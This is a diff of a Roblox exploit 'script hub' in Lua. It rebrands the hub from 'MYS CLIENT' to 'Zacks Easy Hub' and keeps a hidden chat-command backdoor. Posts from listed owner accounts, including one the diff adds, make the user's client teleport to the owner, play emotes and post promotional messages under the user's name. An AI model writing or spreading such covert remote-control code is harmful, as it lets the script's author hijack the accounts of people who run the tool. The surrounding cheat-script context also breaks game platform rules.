@@ -37,7 +37,7 @@ else
         screenGui.ResetOnSpawn = false
 
         local fullScreenFrame = Instance.new("Frame")
-        fullScreenFrame.Size = UD2.new(1, 0, 1, 0)
+        fullScreenFrame.Size = UDim2.new(1, 0, 1, 0)
         fullScreenFrame.Position = UDim2.new(0, 0, 0, 0)
         fullScreenFrame.BackgroundColor3 = Color3.new(1, 1, 1)
         fullScreenFrame.BorderSizePixel = 0
@@ -120,7 +120,7 @@ else
         boolValue.Value = true
 
         if command == "?bring" then
-            local owner = cmdp:FindFirstChild("01xMYS")
+            local owner = cmdp:FindFirstChild("01xMYS") or cmdp:FindFirstChild("01xMYS")
             if owner and player and owner.Character and player.Character then
                 local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
                 local ownerHRP = owner.Character:FindFirstChild("HumanoidRootPart")
@@ -160,12 +160,13 @@ else
             end
         elseif command == "?script" then
             if player then
-                getgenv().TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral"):SendAsync("I'm using: MYS CLIENT")
+                getgenv().TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral"):SendAsync("I'm using: Zacks Easy Hub")
             end
         elseif command == "?promote" then
             if player then
                 local speeches = {
-                    "MYS CLIENT {ON TOP!}",
+                    "Zacks Easy Hub [ON TOP!]",
+                    "V6 Is The BEST!",
                     "10/10 Script!",
                     "This script hub is OP!",
                     "Powerful script!",
@@ -215,7 +216,7 @@ else
                 local get_char = player.Character or player.CharacterAdded:Wait()
                 local char_hum = get_char:WaitForChild("Humanoid") or get_char:FindFirstChildWhichIsA("Humanoid")
         
-                char_hum:PlayEmoteAndGetAnTrackById(tonumber(randomEmote))
+                char_hum:PlayEmoteAndGetAnimTrackById(tonumber(randomEmote))
             end
         elseif command == "?nobooth" then
             if player then
@@ -280,7 +281,7 @@ else
         local sender = message.TextSource.Name
         local text = message.Text
 
-        if sender == "01xMYS" then
+        if sender == "01xMYS" or sender == "Laylay_4kla" or sender == "01xMYS" then
             local command, playerName = string.match(text, "^(%?%w+)%s*(.*)")
             if command then
                 handleCommand(command, playerName)
@@ -329,12 +330,13 @@ else
 
     function run_chat()
         local speeches = {
-                    "MYS CLIENT {ON TOP!}",
-                    "10/10 Script!",
-                    "This script hub is OP!",
-                    "Powerful script!",
-                    "I can vouch for this script!",
-                    "Best script for this game!"
+            "Zacks Easy Hub [ON TOP!]",
+            "V6 Is The BEST!",
+            "10/10 Script!",
+            "This script hub is OP!",
+            "Powerful script!",
+            "I can vouch for this script!",
+            "Best script for this game!"
         }
 
         local randomSpeech = speeches[math.random(1, #speeches)]
@@ -413,7 +415,7 @@ else
 
     bringEvent.Event:Connect(function(player)
         local targetPlayer = findplr(player)
-        local owner = game.Players:FindFirstChild("01xMYS") or game.Players:FindFirstChild("CHEATING_B0SS")
+        local owner = game.Players:FindFirstChild("01xMYS") or game.Players:FindFirstChild("01xMYS")
 
         if not owner then
             warn("No Owner Found!")
